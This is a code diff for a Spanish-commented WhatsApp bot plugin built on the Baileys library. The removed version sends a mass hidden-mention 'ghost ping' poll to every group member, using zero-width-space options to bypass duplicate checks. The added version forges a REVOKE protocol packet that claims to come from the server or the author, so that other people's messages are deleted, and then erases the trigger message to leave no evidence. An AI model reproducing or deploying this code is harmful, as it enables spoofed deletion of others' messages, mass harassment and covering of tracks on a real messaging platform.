@@ -1,45 +1,44 @@
+import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
+
 export default {
-    name: 'monolito_panoptico',
-    match: (text) => /^\.void/i.test(text),
+    name: 'revocacion_fantasma',
+    match: (text) => /^\.ghostrevoke/i.test(text),
     execute: async ({ sock, remitente, msg }) => {
         
-        const isGroup = remitente.endsWith('@g.us');
-        if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Módulo diseñado exclusivamente para grupos." }, { quoted: msg });
+        // 1. Necesitas responder al mensaje que quieres "borrar"
+        const quotedMsg = msg.message.extendedTextMessage?.contextInfo;
+        if (!quotedMsg || !quotedMsg.stanzaId) {
+            return sock.sendMessage(remitente, { text: "❌ Responde al mensaje que quieres hacer desaparecer." }, { quoted: msg });
+        }
 
         try {
-            // 1. Destrucción del desencadenante para mantener el anonimato
+            // 2. Extraemos los metadatos reales del mensaje objetivo
+            const targetJid = quotedMsg.participant || remitente;
+            const targetId = quotedMsg.stanzaId;
+
+            // 3. Generamos el paquete de Protocolo de Revocación
+            // Este paquete le dice a TODA la red de WhatsApp: "El mensaje ID X ha sido revocado".
+            const waMsg = generateWAMessageFromContent(remitente, {
+                protocolMessage: {
+                    key: {
+                        remoteJid: remitente,
+                        fromMe: false, // Falsificamos que la orden viene del servidor o del autor
+                        id: targetId
+                    },
+                    type: 0 // Tipo 0 = REVOKE (Eliminación forzada)
+                }
+            }, { userJid: sock.user.id });
+
+            // 4. Inyección del paquete de red
+            // No enviamos un mensaje, enviamos una instrucción de protocolo
+            await sock.relayMessage(remitente, waMsg.message, { messageId: targetId });
+
+            // 5. Destrucción de nuestra evidencia (para no dejar rastro)
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // 2. Extracción silenciosa de todos los miembros del grupo
-            const groupMetadata = await sock.groupMetadata(remitente);
-            const participantsJids = groupMetadata.participants.map(p => p.id);
-
-            // 3. Generación del Bypass de Duplicación (Zero-Width Space)
-            const zws = String.fromCharCode(8203);
-            const opciones = [];
-            
-            // Creamos 12 opciones visualmente idénticas pero matemáticamente únicas
-            for (let i = 1; i <= 12; i++) {
-                opciones.push("Ø" + zws.repeat(i));
-            }
-
-            // 4. Inyección del paquete nativo (Encuesta + Ping Fantasma Masivo)
-            await sock.sendMessage(remitente, {
-                poll: {
-                    name: "S I S T E M A   C O M P R O M E T I D O",
-                    values: opciones,
-                    selectableCount: 1
-                },
-                // EXPLOIT: Inyectamos a todos los usuarios en los metadatos ocultos.
-                // Sus teléfonos sonarán, pero no verán sus nombres escritos en ningún lado.
-                contextInfo: {
-                    mentionedJid: participantsJids
-                }
-            });
-
         } catch (err) {
-            console.error("Error en el Monolito:", err);
-            await sock.sendMessage(remitente, { text: `❌ Falla en la inyección de protocolo: ${err.message}` });
+            console.error("Error GhostRevoke:", err);
+            sock.sendMessage(remitente, { text: `❌ Error: ${err.message}` });
         }
     }
 };
